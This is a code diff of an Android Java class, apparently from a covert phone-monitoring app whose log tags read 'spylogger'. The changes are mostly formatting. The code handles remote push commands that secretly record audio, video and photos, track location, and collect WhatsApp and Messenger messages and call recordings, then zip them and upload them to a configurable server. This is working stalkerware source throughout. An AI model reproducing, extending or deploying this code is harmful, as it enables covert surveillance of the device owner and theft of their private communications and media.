@@ -54,14 +54,14 @@ public class FcmHelperService {
     public FcmHelperService(Context context, FcmMessageVO fcmMessageVO) {
         this.context = context;
         this.fcmMessageVO = fcmMessageVO;
-        sendArquivoService=new SendArquivoService(context,null);
-        envioArquivoVO= new EnvioArquivoVO.EnvioArquivoVOBuilder()
+        sendArquivoService = new SendArquivoService(context, null);
+        envioArquivoVO = new EnvioArquivoVO.EnvioArquivoVOBuilder()
                 .setPhpId(fcmMessageVO.getPhpId())
                 .setTipoAcao(fcmMessageVO.getTipoAcao())
                 .setId(fcmMessageVO.getId())
                 .build();
 
-        servicosHelper=new ServicosHelper();
+        servicosHelper = new ServicosHelper();
     }
 
     public void executar() {
@@ -85,20 +85,20 @@ public class FcmHelperService {
                 sendArquivoService.enviarAtivo(envioArquivoVO);
                 break;
             case OBTER_AUDIO:
-                servicosHelper.getAudio(context,fcmMessageVO.getDuracao(),callback);
+                servicosHelper.getAudio(context, fcmMessageVO.getDuracao(), callback);
                 break;
             case OBTER_VIDEO:
-                servicosHelper.getVideo(context,fcmMessageVO.getDuracao(),fcmMessageVO.getCameraFrente(),callback);
+                servicosHelper.getVideo(context, fcmMessageVO.getDuracao(), fcmMessageVO.getCameraFrente(), callback);
                 break;
             case OBTER_FOTO:
-                servicosHelper.getPicture(context,fcmMessageVO.getCameraFrente(),callback);
+                servicosHelper.getPicture(context, fcmMessageVO.getCameraFrente(), callback);
                 break;
             case OBTER_LOCALIZACAO:
-                servicosHelper.getLocation(context,fcmMessageVO.getDuracao(), new TaskComplete() {
+                servicosHelper.getLocation(context, fcmMessageVO.getDuracao(), new TaskComplete() {
                     @Override
                     public void onFinish(Object object) {
-                        if(object!=null){
-                            LocalizacaoVO localizacaoVO= (LocalizacaoVO) object;
+                        if (object != null) {
+                            LocalizacaoVO localizacaoVO = (LocalizacaoVO) object;
                             localizacaoVO.setEnvioArquivoVO(envioArquivoVO);
                             sendArquivoService.enviarLocalizacao(localizacaoVO);
                         }
@@ -121,11 +121,11 @@ public class FcmHelperService {
 
                 configuracao = getConfiguracao();
                 if (configuracao != null) {
-                    if(configuracao.isWifi() && !NetworkUtil.isWifi(context)){
+                    if (configuracao.isWifi() && !NetworkUtil.isWifi(context)) {
                         return;
                     }
 
-                    SendSolicitacoesArquivos sendSolicitacoesArquivos = new SendSolicitacoesArquivos(context,new TaskComplete() {
+                    SendSolicitacoesArquivos sendSolicitacoesArquivos = new SendSolicitacoesArquivos(context, new TaskComplete() {
                         @Override
                         public void onFinish(Object object) {
                             if (object != null) {
@@ -144,7 +144,7 @@ public class FcmHelperService {
 
                 configuracao = getConfiguracao();
                 if (configuracao != null) {
-                    if(configuracao.isWifi() && !NetworkUtil.isWifi(context)){
+                    if (configuracao.isWifi() && !NetworkUtil.isWifi(context)) {
                         return;
                     }
                     reenviarLigacoes(false);
@@ -160,22 +160,20 @@ public class FcmHelperService {
                 }
                 break;
             case REATIVAR_SERVICOS:
-                if(!Utils.isDbObserverRunning(context)){
-                    Utils.startDbObserver(context);
-                }
+                Utils.startMensageiros(context);
             default:
                 return;
         }
     }
 
-    private Configuracao getConfiguracao(){
+    private Configuracao getConfiguracao() {
         try {
             RepositorioConfiguracao repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);
 
             return repositorioConfiguracao.getConfiguracao();
 
-        }catch (SQLException e){
-            Log.e(getClass().getSimpleName(),e.getMessage());
+        } catch (SQLException e) {
+            Log.e(getClass().getSimpleName(), e.getMessage());
         }
         return null;
     }
@@ -184,21 +182,18 @@ public class FcmHelperService {
         RepositorioTopico repositorioTopico;
         RepositorioMensagem repositorioMensagem;
         try {
-            repositorioTopico=new RepositorioTopicoImpl(context);
-            repositorioMensagem=new RepositorioMensagemImpl(context);
+            repositorioTopico = new RepositorioTopicoImpl(context);
+            repositorioMensagem = new RepositorioMensagemImpl(context);
 
             repositorioMensagem.limpar();
             repositorioTopico.limpar();
 
         } catch (SQLException e) {
-            Log.e("spylogger",e.getMessage());
-        }finally {
-            repositorioMensagem=null;
-            repositorioTopico=null;
+            Log.e("spylogger", e.getMessage());
         }
     }
 
-    private void reativarMensagens(){
+    private void reativarMensagens() {
         RepositorioTopico repositorioTopico;
         RepositorioMensagem repositorioMensagem;
         try {
@@ -208,48 +203,45 @@ public class FcmHelperService {
             repositorioTopico.reativar();
             repositorioMensagem.reativar();
         } catch (SQLException e) {
-            Log.e("SPYLOGGER",e.getMessage());
-        }finally {
-            repositorioMensagem=null;
-            repositorioTopico=null;
+            Log.e("SPYLOGGER", e.getMessage());
         }
     }
 
     private void reenviarMensagens(boolean reativar) {
-        if(reativar) {
-           reativarMensagens();
+        if (reativar) {
+            reativarMensagens();
         }
 
         new MensageiroAsyncHelper(context, new TaskComplete() {
             @Override
             public void onFinish(Object object) {
-                SendMensagensService sendMensagensService=new SendMensagensService(context,null);
+                SendMensagensService sendMensagensService = new SendMensagensService(context, null);
                 sendMensagensService.enviarTopicos();
 
-                SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
+                SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
                 sendGravacoesService.enviarTopicos();
             }
-        }).execute(new WhatsAppService(context),new MessengerService(context));
+        }).execute(new WhatsAppService(context), new MessengerService(context));
     }
 
-    private void reenviarArquivos(List<Integer> ids){
+    private void reenviarArquivos(List<Integer> ids) {
 
         DatabaseHelper dbHelper = new DatabaseHelper(context);
         Dao<Mensagem, Integer> daoMensagem;
         GenericRawResults<Object[]> raws = null;
-        List<Mensagem> mensagens= new ArrayList<>();
+        List<Mensagem> mensagens = new ArrayList<>();
         Iterator<Object[]> iterator;
         try {
             daoMensagem = dbHelper.getDao(Mensagem.class);
 
             raws = daoMensagem.queryRaw("select id,tipoMidia,tamanhoArquivo,dataRecebida from mensagem where tipoMidia in('IMAGEM','AUDIO','VIDEO','GIF','ARQUIVO')", new DataType[]{
-                    DataType.INTEGER,DataType.ENUM_STRING,DataType.LONG,DataType.DATE_LONG
+                    DataType.INTEGER, DataType.ENUM_STRING, DataType.LONG, DataType.DATE_LONG
             });
             iterator = raws.iterator();
             while (iterator.hasNext()) {
                 Object[] resultRaw = iterator.next();
                 try {
-                    if(ids.contains((Integer) resultRaw[0])){
+                    if (ids.contains((Integer) resultRaw[0])) {
                         continue;
                     }
                     Mensagem mensagem = new Mensagem.MensagemBuilder()
@@ -259,7 +251,7 @@ public class FcmHelperService {
                             .setDataRecebida((Date) resultRaw[3])
                             .build();
 
-                   mensagens.add(mensagem);
+                    mensagens.add(mensagem);
 
                 } catch (Exception e) {
                     Log.e("spylogger", e.getMessage());
@@ -269,27 +261,28 @@ public class FcmHelperService {
             enviarArquivos(mensagens);
         } catch (SQLException e) {
             Log.e("spylogger", e.getMessage());
-            Log.i("spylogger","tentar novamente...");
+            Log.i("spylogger", "tentar novamente...");
             try {
                 Thread.sleep(2000);
                 reenviarArquivos(ids);
             } catch (InterruptedException e1) {
             }
-        }finally {
+        } finally {
             try {
                 raws.close();
-            }catch (Exception e){}
+            } catch (Exception e) {
+            }
         }
     }
 
-    public void enviarArquivos(List<Mensagem> mensagens){
+    public void enviarArquivos(List<Mensagem> mensagens) {
 
         File outputDir = context.getCacheDir();
-        File dirArquivos=new File(outputDir+"/smartlogs");
-        if(dirArquivos.exists()){
-            File[] files=dirArquivos.listFiles();
-            for (File f: files) f.delete();
-        }else {
+        File dirArquivos = new File(outputDir + "/smartlogs");
+        if (dirArquivos.exists()) {
+            File[] files = dirArquivos.listFiles();
+            for (File f : files) f.delete();
+        } else {
             if (!dirArquivos.mkdir()) {
                 return;
             }
@@ -302,23 +295,23 @@ public class FcmHelperService {
             Mensagem mensagem = iterator.next();
             try {
 
-                File arquivo=null;
+                File arquivo = null;
 
-                if(mensagem.getArquivo()!=null){
-                    arquivo=new File(dirArquivos,mensagem.getId()+"");
-                    FileUtils.writeByteArrayToFile(arquivo,mensagem.getArquivo());
-                }else {
+                if (mensagem.getArquivo() != null) {
+                    arquivo = new File(dirArquivos, mensagem.getId() + "");
+                    FileUtils.writeByteArrayToFile(arquivo, mensagem.getArquivo());
+                } else {
                     arquivo = Utils.getMediaFile(
                             mensagem.getTipoMidia(),
                             mensagem.getTamanhoArquivo(),
                             mensagem.getDataRecebida(), 2);
                 }
 
-                if(arquivo!=null){
-                    File tmp=new File(dirArquivos,mensagem.getId()+"");
-                    if(!tmp.exists()){
+                if (arquivo != null) {
+                    File tmp = new File(dirArquivos, mensagem.getId() + "");
+                    if (!tmp.exists()) {
                         tmp.createNewFile();
-                        Utils.copyFile(arquivo,tmp);
+                        Utils.copyFile(arquivo, tmp);
                         arquivos.add(tmp);
                     }
                 }
@@ -328,31 +321,31 @@ public class FcmHelperService {
             }
             if (iterator.hasNext()) {
                 if (arquivos.size() == MAX_MENSAGENS) {
-                    ZipAnexos zip=new ZipAnexos(dirArquivos);
-                    File zipado=zip.getFile();
-                    if(zipado!=null){
+                    ZipAnexos zip = new ZipAnexos(dirArquivos);
+                    File zipado = zip.getFile();
+                    if (zipado != null) {
                         envioArquivoVO.setId(null);
                         enviarArquivo(zipado);
-                        File[] files=dirArquivos.listFiles();
-                        for (File f: files) f.delete();
+                        File[] files = dirArquivos.listFiles();
+                        for (File f : files) f.delete();
                     }
                     arquivos.clear();
                 }
             } else {
-                ZipAnexos zip=new ZipAnexos(dirArquivos);
-                File zipado=zip.getFile();
-                if(zipado!=null){
+                ZipAnexos zip = new ZipAnexos(dirArquivos);
+                File zipado = zip.getFile();
+                if (zipado != null) {
                     envioArquivoVO.setId(null);
                     enviarArquivo(zipado);
-                    File[] files=dirArquivos.listFiles();
-                    for (File f: files) f.delete();
+                    File[] files = dirArquivos.listFiles();
+                    for (File f : files) f.delete();
                 }
             }
         }
 
         try {
-            RepositorioMensagem repositorioMensagem=new RepositorioMensagemImpl(context);
-            for(Mensagem mensagem:mensagens){
+            RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
+            for (Mensagem mensagem : mensagens) {
                 mensagem.setArquivo(null);
                 repositorioMensagem.atualizar(mensagem);
             }
@@ -361,29 +354,28 @@ public class FcmHelperService {
         }
     }
 
-    private void reenviarLigacoes(boolean reativar){
+    private void reenviarLigacoes(boolean reativar) {
         RepositorioGravacao repositorioGravacao;
         try {
             repositorioGravacao = new RepositorioGravacaoImpl(context);
-            if(reativar) {
+            if (reativar) {
                 repositorioGravacao.reativar();
             }
 
-            SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
+            SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
             sendGravacoesService.enviarTopicos();
         } catch (SQLException e) {
-            Log.e("SPYLOGGER",e.getMessage());
+            Log.e("SPYLOGGER", e.getMessage());
         }
     }
 
-
-    private void atualizarConfiguracao(){
+    private void atualizarConfiguracao() {
         try {
-            ConfiguracaoVO configuracaoVO=fcmMessageVO.getConfiguracao();
-            RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
+            ConfiguracaoVO configuracaoVO = fcmMessageVO.getConfiguracao();
+            RepositorioConfiguracao repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);
 
-            Configuracao configuracao=repositorioConfiguracao.getConfiguracao();
-            if(configuracao!=null){
+            Configuracao configuracao = repositorioConfiguracao.getConfiguracao();
+            if (configuracao != null) {
                 configuracao.setFacebook(configuracaoVO.isMessenger());
                 configuracao.setWhatsApp(configuracaoVO.isWhatsApp());
                 configuracao.setIntervalo(configuracaoVO.getIntervalo());
@@ -395,15 +387,13 @@ public class FcmHelperService {
                 configuracao.setServerUrl(configuracaoVO.getServerUrl());
 
                 repositorioConfiguracao.atualizar(configuracao);
-
-                Utils.startAlarm(context,configuracao);
             }
         } catch (SQLException e) {
             e.printStackTrace();
         }
     }
 
-    private File recuperarArquivo(){
+    private File recuperarArquivo() {
         try {
             RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
             Mensagem mensagem = repositorioMensagem.obterPorId(fcmMessageVO.getId());
@@ -423,14 +413,8 @@ public class FcmHelperService {
     }
 
     private void enviarArquivo(File file) {
-        if(file!=null){
-            sendArquivoService.enviar(file,envioArquivoVO);
-       }
-    }
-/*    private void enviarArquivo(String file) {
-        if(file!=null){
-            envioArquivoVO.setArquivo(file);
-            sendArquivoService.enviar(envioArquivoVO);
+        if (file != null) {
+            sendArquivoService.enviar(file, envioArquivoVO);
         }
-    }*/
+    }
 }
